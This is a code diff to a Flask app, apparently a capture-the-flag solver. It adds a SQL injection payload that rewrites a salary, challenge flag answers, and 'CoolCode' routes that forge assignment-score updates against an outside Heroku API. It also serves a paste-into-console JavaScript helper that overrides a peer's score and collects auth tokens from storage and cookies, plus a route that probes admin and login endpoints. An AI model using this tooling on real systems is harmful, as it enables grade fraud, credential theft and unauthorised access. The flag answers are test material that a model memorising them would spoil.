@@ -4,6 +4,7 @@ from functools import lru_cache
 from typing import List, Tuple, Optional, Dict, Any
 import math
 import re
+import requests
 
 app = Flask(__name__)
 
@@ -13,7 +14,11 @@ def get_payload():
 
 @app.route('/payload_sqlinject', methods=['GET'])
 def get_sql():
-    return "Alice'; UPDATE salary SET salary=999999 WHERE name='Alice'; --"
+    return jsonify({
+        "payload": "Alice'; UPDATE salary SET salary=999999 WHERE name='Alice'; --",
+        "type": "sql_injection",
+        "target": "name"
+    })
 
 @app.route('/payload_stack', methods=['GET'])
 def get_stack():
@@ -26,9 +31,281 @@ def chase_flags():
         "challenge2": "UBS{}",
         "challenge3": "UBS{}",
         "challenge4": "UBS{}",
-        "challenge5": "UBS{474owrgw8fbyy}"  # UBS{16lt0tt13zm1es}
+        "challenge5": "UBS{16lt0tt13zm1es}"  # UBS{474owrgw8fbyy}
     }
     return jsonify(flags), 201
+
+### coolcode
+@app.route('/update_score', methods=['POST'])
+def update_assignment_score():
+    try:
+        # Get data from request
+        data = request.get_json()
+        
+        if not data:
+            return jsonify({"error": "No JSON data provided"}), 400
+        
+        # Validate required fields
+        required_fields = ["username", "assignmentId", "score"]
+        for field in required_fields:
+            if field not in data:
+                return jsonify({"error": f"Missing required field: {field}"}), 400
+        
+        # Prepare the payload for the CoolCode API
+        payload = {
+            "username": str(data["username"]),
+            "assignmentId": int(data["assignmentId"]),
+            "score": float(data["score"])
+        }
+        
+        # CoolCode API endpoint
+        api_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
+        
+        # Make the POST request to CoolCode API
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://coolcode-hacker-34c5455cd908.herokuapp.com",
+            "Referer": "https://coolcode-hacker-34c5455cd908.herokuapp.com/"
+        }
+        
+        # Add custom headers if provided
+        if "headers" in data:
+            headers.update(data["headers"])
+        
+        response = requests.post(api_url, json=payload, headers=headers, timeout=30)
+        
+        # Return the response from CoolCode API
+        return jsonify({
+            "status": "success",
+            "coolcode_response": {
+                "status_code": response.status_code,
+                "response_text": response.text,
+                "headers": dict(response.headers)
+            },
+            "payload_sent": payload
+        }), 200
+        
+    except requests.exceptions.RequestException as e:
+        return jsonify({
+            "error": "Failed to connect to CoolCode API",
+            "details": str(e)
+        }), 500
+    except ValueError as e:
+        return jsonify({
+            "error": "Invalid data format",
+            "details": str(e)
+        }), 400
+    except Exception as e:
+        return jsonify({
+            "error": "Unexpected error",
+            "details": str(e)
+        }), 500
+
+@app.route('/browser_helper', methods=['GET'])
+def browser_helper():
+    """
+    Provides JavaScript code snippets for browser console use
+    """
+    js_code = """
+// CTF Browser Console Helper Scripts
+console.log("=== CoolCode Score Override Helper ===");
+
+// 1. Basic API call function
+function overrideScore(username, assignmentId, score, authToken = null) {
+    const headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'X-Requested-With': 'XMLHttpRequest'
+    };
+    
+    // Add auth token if provided
+    if (authToken) {
+        headers['Authorization'] = `Bearer ${authToken}`;
+        // Try common auth header variations
+        headers['X-Auth-Token'] = authToken;
+        headers['X-API-Key'] = authToken;
+    }
+    
+    return fetch('https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score', {
+        method: 'POST',
+        headers: headers,
+        credentials: 'include', // Include cookies
+        body: JSON.stringify({
+            "username": username,
+            "assignmentId": assignmentId,
+            "score": score
+        })
+    })
+    .then(response => {
+        console.log('Response status:', response.status);
+        return response.text();
+    })
+    .then(data => {
+        console.log('Response data:', data);
+        return data;
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        return error;
+    });
+}
+
+// 2. Extract auth tokens from page
+function findAuthTokens() {
+    const tokens = [];
+    
+    // Check localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
+            tokens.push({source: 'localStorage', key: key, value: value});
+        }
+    }
+    
+    // Check sessionStorage
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
+            tokens.push({source: 'sessionStorage', key: key, value: value});
+        }
+    }
+    
+    // Check cookies
+    document.cookie.split(';').forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (name && (name.toLowerCase().includes('token') || name.toLowerCase().includes('auth') || name.toLowerCase().includes('session'))) {
+            tokens.push({source: 'cookie', key: name, value: value});
+        }
+    });
+    
+    console.log('Found potential auth tokens:', tokens);
+    return tokens;
+}
+
+// 3. Monitor network requests
+function monitorRequests() {
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        console.log('Fetch intercepted:', args);
+        return originalFetch.apply(this, args).then(response => {
+            console.log('Response received:', response);
+            return response;
+        });
+    };
+    console.log('Request monitoring enabled');
+}
+
+// 4. Quick score override (modify as needed)
+function quickOverride() {
+    const username = prompt("Enter peer's username:");
+    const assignmentId = prompt("Enter assignment ID:");
+    const score = prompt("Enter new score:");
+    
+    if (username && assignmentId && score) {
+        overrideScore(username, parseInt(assignmentId), parseFloat(score));
+    }
+}
+
+// Usage examples:
+console.log("Available functions:");
+console.log("- overrideScore('username', 1, 100)");
+console.log("- findAuthTokens()");
+console.log("- monitorRequests()");
+console.log("- quickOverride()");
+
+// Auto-run token discovery
+findAuthTokens();
+"""
+    
+    return f"""
+    <html>
+    <head><title>CoolCode CTF Helper</title></head>
+    <body>
+        <h1>CoolCode Score Override - CTF Helper</h1>
+        <h2>Browser Console Instructions</h2>
+        <ol>
+            <li>Open Developer Tools (F12)</li>
+            <li>Go to Console tab</li>
+            <li>Copy and paste the following JavaScript code:</li>
+        </ol>
+        <textarea style="width:100%; height:400px; font-family:monospace;">{js_code}</textarea>
+        
+        <h2>Manual Steps</h2>
+        <ol>
+            <li>Navigate to: <a href="https://coolcode-hacker-34c5455cd908.herokuapp.com" target="_blank">CoolCode Website</a></li>
+            <li>Open Network tab in DevTools</li>
+            <li>Look for existing API calls</li>
+            <li>Use the JavaScript functions above to override scores</li>
+        </ol>
+        
+        <h2>API Details</h2>
+        <p><strong>Endpoint:</strong> POST https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score</p>
+        <p><strong>Payload Format:</strong></p>
+        <pre>{{
+    "username": "student_username",
+    "assignmentId": 123,
+    "score": 100
+}}</pre>
+    </body>
+    </html>
+    """, 200, {'Content-Type': 'text/html'}
+
+@app.route('/explore_coolcode', methods=['GET'])
+def explore_coolcode():
+    """
+    Route to explore the CoolCode website and gather information.
+    """
+    try:
+        base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
+        
+        # Try to access different endpoints to explore the site
+        endpoints_to_try = [
+            "/",
+            "/api",
+            "/api/assignment",
+            "/api/students",
+            "/api/assignments",
+            "/login",
+            "/admin",
+            "/dashboard"
+        ]
+        
+        results = {}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+        
+        for endpoint in endpoints_to_try:
+            try:
+                url = base_url + endpoint
+                response = requests.get(url, headers=headers, timeout=10)
+                results[endpoint] = {
+                    "status_code": response.status_code,
+                    "content_length": len(response.content),
+                    "headers": dict(response.headers),
+                    "preview": response.text[:500] if response.text else "No content"
+                }
+            except Exception as e:
+                results[endpoint] = {
+                    "error": str(e)
+                }
+        
+        return jsonify({
+            "exploration_results": results,
+            "target_api": "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "error": "Failed to explore CoolCode",
+            "details": str(e)
+        }), 500
 
 ####### trading bot
 BULL_TOKENS = {
